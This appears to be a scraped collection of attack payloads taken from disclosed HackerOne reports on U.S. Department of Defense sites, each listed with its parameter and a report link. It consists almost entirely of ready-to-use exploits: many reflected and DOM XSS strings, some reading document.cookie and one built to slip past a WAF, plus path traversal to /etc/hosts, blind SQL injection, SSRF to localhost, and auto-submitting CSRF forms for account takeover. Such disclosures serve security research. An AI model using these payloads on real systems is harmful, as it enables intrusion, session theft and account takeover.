— [Blind SSRF via image upload URL downloader on https://██████/ ](https://hackerone.com/reports/1691501) · U.S. Dept Of Defense · [696e746c6f6c](https://hackerone.com/696e746c6f6c)

### `91d29cb6`

```
https://localhost/
```

— [Blind SSRF via image upload URL downloader on https://██████/ ](https://hackerone.com/reports/1691501) · U.S. Dept Of Defense · [696e746c6f6c](https://hackerone.com/696e746c6f6c)

### `665da331`

```
https://██████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
```

**Parameter:** `sysparm_url`
— [XSS in ServiceNow logout https://████:443](https://hackerone.com/reports/1699855) · U.S. Dept Of Defense · [colemanj](https://hackerone.com/colemanj)

### `960bbb61`

```
https://█████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
```

**Parameter:** `sysparm_url`
— [XSS in ServiceNow logout https://████:443](https://hackerone.com/reports/1699855) · U.S. Dept Of Defense · [colemanj](https://hackerone.com/colemanj)

### `08b6fe70`

```
https://████████/fcgi-bin/release.py?project=aaa%3Ch1%20onauxclick=confirm(document.domain
```

**Parameter:** `project`
— [Reflected XSS | https://████](https://hackerone.com/reports/1736432) · U.S. Dept Of Defense · [x3ph_](https://hackerone.com/x3ph_)

### `eccf1db4`

```
https://█████████/fcgi-bin/release.py?project=aaa%3Ch1%20onauxclick=confirm(document.domain
```

**Parameter:** `project`
— [Reflected XSS | https://████](https://hackerone.com/reports/1736432) · U.S. Dept Of Defense · [x3ph_](https://hackerone.com/x3ph_)

### `71a2a4e9`

```
https://█████████/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27
```

**Parameter:** `SiteName`
— [Reflective Cross Site Scripting (XSS) on ███████/Pages](https://hackerone.com/reports/1794757) · U.S. Dept Of Defense · [predatorsparrow](https://hackerone.com/predatorsparrow)

### `671b7e6c`

```
https://████████/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27
```

**Parameter:** `SiteName`
— [Reflective Cross Site Scripting (XSS) on ███████/Pages](https://hackerone.com/reports/1794757) · U.S. Dept Of Defense · [predatorsparrow](https://hackerone.com/predatorsparrow)

### `76b5cda8`

```
fld_displaytype=S"%20accesskey%3d"X"%20onclick%3d"alert('XSS Success!')
```

**Parameter:** `fld_displaytype`
— [\[XSS\] Reflected XSS via POST request](https://hackerone.com/reports/1850235) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `71f13a73`

```
emailbody=0xd3adc0de%26lt;ScRiPt%26gt;alert(%27XSS%20Success!%27)%26lt;/sCripT%26gt;
```

**Parameter:** `emailbody`
— [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `757e3dc8`

```
0xd3adc0de<ScRiPt>alert('XSS Success!')</sCripT>
```

**Parameter:** `emailbody`
— [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `1b8791a8`

```
0xd3adc0de&lt;ScRiPt&gt;alert('XSS Success!')&lt;/sCripT&gt;
```

**Parameter:** `emailbody`
— [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `a220c92d`

```
0xd3adc0de%26lt;ScRiPt%26gt;alert(%27XSS%20Success!%27)%26lt;/sCripT%26gt;
```

**Parameter:** `emailbody`
— [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `e550652d`

```
https://█████████████████/auth/logout.jsx?home=javascript:(alert(%27XSS%20Success!%27))()
```

**Parameter:** `home`
— [Reflected XSS in ████████████](https://hackerone.com/reports/1882592) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `943d16a6`

```
https://████████████████/auth/logout.jsx?home=javascript:(alert(%27XSS%20Success!%27))()
```

**Parameter:** `home`
— [Reflected XSS in ████████████](https://hackerone.com/reports/1882592) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `fcd1fe67`

```
https://█████████/███/login/downloadForm?filename=../../../../../../../../etc/hosts
```

**Parameter:** `filename`
— [Path traversal leads to reading of local files on ███████ and ████](https://hackerone.com/reports/1888808) · U.S. Dept Of Defense · [rodriguezjorgex](https://hackerone.com/rodriguezjorgex)

### `213aa33d`

```
https://██████████/████/login/downloadForm?filename=../../../../../../../../etc/hosts
```

**Parameter:** `filename`
— [Path traversal leads to reading of local files on ███████ and ████](https://hackerone.com/reports/1888808) · U.S. Dept Of Defense · [rodriguezjorgex](https://hackerone.com/rodriguezjorgex)

### `7278aa08`

```
\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
```

**Parameter:** `USERNAME`
— [DOM-XSS](https://hackerone.com/reports/1982099) · U.S. Dept Of Defense · [medokll0011](https://hackerone.com/medokll0011)

### `c42e5726`

```
https://█████/sec.html?redirect=javascript:alert(document.cookie
```

**Parameter:** `redirect`
— [Reflected xss on https://█████████](https://hackerone.com/reports/1988560) · U.S. Dept Of Defense · [rektile404](https://hackerone.com/rektile404)

### `2b365fa8`

```
https://█████████/sec.html?redirect=javascript:alert(1
```

**Parameter:** `redirect`
— [Reflected xss on https://█████████](https://hackerone.com/reports/1988560) · U.S. Dept Of Defense · [rektile404](https://hackerone.com/rektile404)

### `6d900e96`

```
https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
```

— [Blind Sql Injection https:/████████](https://hackerone.com/reports/2020429) · U.S. Dept Of Defense · [codeslayer1337](https://hackerone.com/codeslayer1337)

### `25f72612`

```
{"<img onerror=confirm('xss_poc_unexpectedbufferc0n') src/>":1}
```

— [\[██████\] Reflected XSS via Keycloak on ██████](https://hackerone.com/reports/2126954) · U.S. Dept Of Defense · [hackeronanywhere](https://hackerone.com/hackeronanywhere)

### `abf7221c`

```
SAMLResponse=%22%3E%3Csvg/onload=alert(/2XUkWJ29OE88uyTbdZ3a2UmA828/)%3E
```

**Parameter:** `SAMLResponse`
— [XSS in Cisco Endpoint](https://hackerone.com/reports/2233421) · U.S. Dept Of Defense · [r00tdaddy](https://hackerone.com/r00tdaddy)

### `ae736b03`

```
GET /login.php/styles<isindex%20type=image%20src=1%20onerror=chor4o(9939)>/"><BODY%20ONLOAD=alert(0x000123)>/local.css HTTP/1.1
```

**Parameter:** `path`
— [Xss  Parameter: /<s>/\[*\]/<s>.css ████████](https://hackerone.com/reports/2353131) · U.S. Dept Of Defense · [chor4o](https://hackerone.com/chor4o)

### `01e73222`

```
1<ScRiPt>alert(9639)</ScRiPt>
```

— [Xss  - ███](https://hackerone.com/reports/2353185) · U.S. Dept Of Defense · [chor4o](https://hackerone.com/chor4o)

### `3b6f0a4f`

```
Address=███████&Address2=█████&AeonForm=Registration&City=██████&Country=████&Department=Candidate&EMailAddress=█████████&FORMSTATE=1&FirstName=ghovjnjv&ID=1&IDType=1&LastName=ghovjnjv&NotificationMethod=Email&Password1=u]H[ww6KrA9F.x-F&Password2=u]H[ww6KrA9F.x-F&Phone=███&SAddress=██████&SAddress2=█████████&SCity=██████&SCountry=AF&SState=N/A&SZip=██████████&State=N/A&Status=USMA&SubmitButton=Submit%20Information&Username=ghovjnjv'"()%26%25<zzz><ScRiPt>alert(233)</ScRiPt>&Zip=██████████
```

**Parameter:** `Username`
— [Parâmetro XSS: Nome de usuário - █████████](https://hackerone.com/reports/2356104) · U.S. Dept Of Defense · [chor4o](https://hackerone.com/chor4o)

### `b21fb017`

```
https://███████/users/user?error=<img src='x' onerror="alert(document.domain)">
```

**Parameter:** `error`
— [Reflected XSS on error message on Login Page](https://hackerone.com/reports/2417864) · U.S. Dept Of Defense · [kurogai](https://hackerone.com/kurogai)

### `332a8b91`

```
https://██████/users/user?error=<img src='x' onerror="alert(document.domain)">
```

**Parameter:** `error`
— [Reflected XSS on error message on Login Page](https://hackerone.com/reports/2417864) · U.S. Dept Of Defense · [kurogai](https://hackerone.com/kurogai)

### `8ea068b5`

```
</h6><image/src/onerror=alert(document.cookie)>
```

— [Reflected Cross-site Scripting via search query on ██████](https://hackerone.com/reports/2434904) · U.S. Dept Of Defense · [neg0x](https://hackerone.com/neg0x)

### `f16e3253`

```
id: CVE-2022-35653

info:
  name: Moodle LTI module Reflected - Cross-Site Scripting
  author: iamnoooob,pdresearch
  severity: medium
  description: |
    A reflected XSS issue was identified in the LTI module of Moodle. The vulnerability exists due to insufficient sanitization of user-supplied data in the LTI module. A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website to steal po
```

**Parameter:** `body`
— [Reflected XSS via Moodle on ███ \[CVE-2022-35653\]](https://hackerone.com/reports/2444032) · U.S. Dept Of Defense · [maskedpersian](https://hackerone.com/maskedpersian)

### `80f6671d`

```
2. Go to Search Function 
3. Then Insert a Normal XSS payload like ==<script>alert(document.cookie)</script>==The XSS will fireup

████

## Impact

XSS Attacks

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go To
```

**Parameter:** `search`
— [Self XSS](https://hackerone.com/reports/2521186) · U.S. Dept Of Defense · [0xtrav](https://hackerone.com/0xtrav)

### `da8221dd`

```
POST /ca/rest/certrequests HTTP/1.1
Host: ██████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origi
```

**Parameter:** `ProfileID`
— [XML External Entity (XXE) Injection](https://hackerone.com/reports/2573567) · U.S. Dept Of Defense · [maskedpersian](https://hackerone.com/maskedpersian)

### `b5b7e40e`

```
Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG
```

**Parameter:** `User-Agent`
— [Boolen Based Blind Sql Injection Via User Agent in ███.mil](https://hackerone.com/reports/2599826) · U.S. Dept Of Defense · [iamunixtz](https://hackerone.com/iamunixtz)

### `b6335212`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://www.█████/mediagallery/delete/id/{album-id}">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

— [CSRF Attack leads to delete album at](https://hackerone.com/reports/2652190) · U.S. Dept Of Defense · [prakhar0x01](https://hackerone.com/prakhar0x01)

### `f63d5724`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://www.█████████/member/updatesecurityquestions" method="POST">
      <input type="hidden" name="security&#95;questions1" value="1" />
      <input type="hidden" name="security&#95;question&#95;answer1" value="hacked" />
      <input type="hidden" name="security&#95;questions2" value="2" />
      <input type="hidden" name="security&#95;question&#95;answer2" value="hacked" />
      <input type="hidde
```

— [CSRF Attack on changing security questions leads to full Account TakeOver](https://hackerone.com/reports/2652603) · U.S. Dept Of Defense · [prakhar0x01](https://hackerone.com/prakhar0x01)

### `873aecc5`

```
<html>
<body>
<script>
	window.onload = function(){document.forms['XSS'].submit();}
</script>
	<form id='XSS' action='https://█████████/web/guest/search' method='post'>
		<input type='text' name='query' value="'};alert('XSS');var x={y:'">
	</form>
</body>
</html>
```

**Parameter:** `query`
— [XSS found for https://█████████](https://hackerone.com/reports/2670521) · U.S. Dept Of Defense · [thpless](https://hackerone.com/thpless)

### `9afe384f`

```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://████████/account/profile/edit" method="POST">

      <input type="hidden" name="username" value="hacker" />

      <input type="hidden" name="password" value="" />

      <input type="hidden" name="cpassword" value="" />

      <input type="hidden" name="email" value="mojejas248&#64;esterace&#46;com" />

      <input type="hidden" name="save" value="Save" />

      <input type="submit" value="
```

— [CSRF leads to Account takeover](https://hackerone.com/reports/2699029) · U.S. Dept Of Defense · [br0x1337](https://hackerone.com/br0x1337)

### `dca197b7`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://████████/account/profile/edit" method="POST">
      <input type="hidden" name="username" value="hacker" />
      <input type="hidden" name="password" value="" />
      <input type="hidden" name="cpassword" value="" />
      <input type="hidden" name="email" value="rahes53167&#64;esterace&#46;com" />
      <input type="hidden" name="save" value="Save" />
      <input type="submit" value="Submit re
```

— [CSRF leads to Account takeover](https://hackerone.com/reports/2712857) · U.S. Dept Of Defense · [br0x1337](https://hackerone.com/br0x1337)

### `1cb86b89`

```
https://██████████%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
```

— [\[ CVE-2018-1000129 \] RXSS At `https://███████` via the URI](https://hackerone.com/reports/2778412) · U.S. Dept Of Defense · [todayisnew-](https://hackerone.com/todayisnew-)

### `dd92fdd1`

```
https://████████%3Csvg%20onload=alert%28document.cookie%29%3E?mimeType=text/html
```

— [\[ CVE-2018-1000129 \] RXSS At `https://███████` via the URI](https://hackerone.com/reports/2778412) · U.S. Dept Of Defense · [todayisnew-](https://hackerone.com/todayisnew-)

### `6e3b52c3`

```
https://www.███.mil/?code=%27;prompt(%27XSS%27
```

**Parameter:** `code`
— [XSS found in https://www.████████.mil](https://hackerone.com/reports/2853410) · U.S. Dept Of Defense · [thpless](https://hackerone.com/thpless)

### `b07c5c35`

```
https://www.████████.mil/?code=%27;prompt(%27XSS%27
```

**Parameter:** `code`
— [XSS found in https://www.████████.mil](https://hackerone.com/reports/2853410) · U.S. Dept Of Defense · [thpless](https://hackerone.com/thpless)

### `d647b47b`

```
document.cookie
```

— [XSS on ███](https://hackerone.com/reports/3053220) · U.S. Dept Of Defense · [bewgsy](https://hackerone.com/bewgsy)

### `54411a29`

```
2. Enter this in the search: ``      -alert(0)-    ``or simply visit: ██████
```

**Parameter:** `search`
— [XSS on ███](https://hackerone.com/reports/3053220) · U.S. Dept Of Defense · [bewgsy](https://hackerone.com/bewgsy)

### `f5b08d2f`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████████" method="POST">
      <input type="hidden" name="data&#91;account&#93;&#91;addedon&#93;" value="2022&#45;11&#45;22&#32;00&#58;51&#58;28" />
      <input type="hidden" name="data&#91;account&#93;&#91;confirmcode&#93;" value="ydtgsonuk4xk" />
      <input type="hidden" name="data&#91;account&#93;&#91;confirmed&#93;" value="0" />
      <input type="hidden" name="data&#91;account&#93;&#91;descriptio
```

**Parameter:** `data[account][id]`
— [POST XSS - data\[account\]\[id\] parameter](https://hackerone.com/reports/3127147) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `90cbc753`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████" method="POST">
      <input type="hidden" name="data&#91;account&#93;&#91;addedon&#93;" value="2022&#45;11&#45;22&#32;00&#58;51&#58;28" />
      <input type="hidden" name="data&#91;account&#93;&#91;confirmcode&#93;" value="ydtgsonuk4xk" />
      <input type="hidden" name="data&#91;account&#93;&#91;confirmed&#93;" value="0" />
      <input type="hidden" name="data&#91;account&#93;&#91;description&#9
```

**Parameter:** `data[account][type]`
— [POST XSS -  data\[type\] parameter](https://hackerone.com/reports/3127154) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `462ce7d1`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████████" method="POST">
      <input type="hidden" name="fields&#91;account&#93;&#91;firstname&#93;" value="fnfOzvSR&lt;img&#32;src&#61;x&#32;onerror&#61;prompt&#40;1&#41;&gt;" />
      <input type="hidden" name="fields&#91;account&#93;&#91;lastname&#93;" value="fnfOzvSR" />
      <input type="hidden" name="fields&#91;contacts&#93;&#91;email&#93;" value="testing&#64;example&#46;com" />
      <input type
```

**Parameter:** `fields[account][firstname]`
— [POST XSS -  fields\[account\]\[firstname\] parameter](https://hackerone.com/reports/3127158) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `b443497d`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="███" method="POST">
      <input type="hidden" name="FirstName" value="WkYxnTGh" />
      <input type="hidden" name="LastName" value="WkYxnTGh" />
      <input type="hidden" name="Message" value="555" />
      <input type="hidden" name="MiddleInitial" value="A" />
      <input type="hidden" name="State" value="AL" />
      <input type="hidden" name="email" value="testing&#64;example&#46;com" />
      <in
```

**Parameter:** `return_link_url`
— [Cross-Site Scripting via 'return_link_url' parameter ](https://hackerone.com/reports/3137200) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `15f77bc0`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="███████" method="POST">
      <input type="hidden" name="doImports" value="false" />
      <input type="hidden" name="entryid" value="d00cc920&#45;e292&#45;4475&#45;8e23&#45;c6cbf69f5725" />
      <input type="hidden" name="wikitext" value="&#123;&#123;information&#32;details&#61;true&#125;&#125;&#32;&#123;&#123;tabletree&#32;&#32;message&#61;&quot;&quot;&#125;&#125;&lt;iframe&#32;src&#61;&quot;data&#58;
```

**Parameter:** `wikitext`
— [Cross-Site Scripting via 'wikitext' parameter](https://hackerone.com/reports/3137212) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `0a223313`

```
Payload used: (Z('ontestingb3t2h onload=print`` fnwve='zzzzz`8504695818`'))
- This payload successfully triggered JavaScript execution using the onload attribute.
- The use of print`` instead of alert()` was necessary to bypass Web Application Firewall (WAF) protections and filter-based sanitization.
```

— [Cross-Site Scripting (XSS) in target.com via ResolveUrl on ████ ](https://hackerone.com/reports/3166579) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `d644c0c0`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="█████" method="POST">
      <input type="hidden" name="EVENT&#95;DESCRIPTION" value="&lt;&#47;textarea&gt;&lt;input&gt;&lt;&#47;zzz&gt;&lt;zzz&gt;&lt;img&#47;src&#47;onerror&#61;print&#96;&#96;&gt;&lt;&#47;zzz&gt;" />
      <input type="hidden" name="YEARS&#95;OF&#95;EVENT" value="&lt;input&gt;" />
      <input type="hidden" name="EVENT&#95;WEB&#95;SITE" value="&lt;input&gt;" />
      <input type="hidden
```

**Parameter:** `EVENT_DESCRIPTION`
— [Cross-Site Scripting via 'EVENT_DESCRIPTION' parameter](https://hackerone.com/reports/3284381) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `155878c1`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████████" method="POST">
      <input type="hidden" name="EVENT&#95;DESCRIPTION" value="1234" />
      <input type="hidden" name="YEARS&#95;OF&#95;EVENT" value="&lt;input&gt;" />
      <input type="hidden" name="EVENT&#95;WEB&#95;SITE" value="&lt;input&gt;" />
      <input type="hidden" name="ADMISSION&#95;FEE" value="&lt;input&gt;1234" />
      <input type="hidden" name="PARKING&#95;FEE" value="&lt;inpu
```

**Parameter:** `RAISED_FUNDS_DESC`
— [Cross-Site Scripting via 'RAISED_FUNDS_DESC' parameter](https://hackerone.com/reports/3284389) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `cd85285b`

```
████████"document.cookie")>
```

— [Reflected Cross-Site Scripting (XSS)](https://hackerone.com/reports/3284534) · U.S. Dept Of Defense · [maskedpersian](https://hackerone.com/maskedpersian)
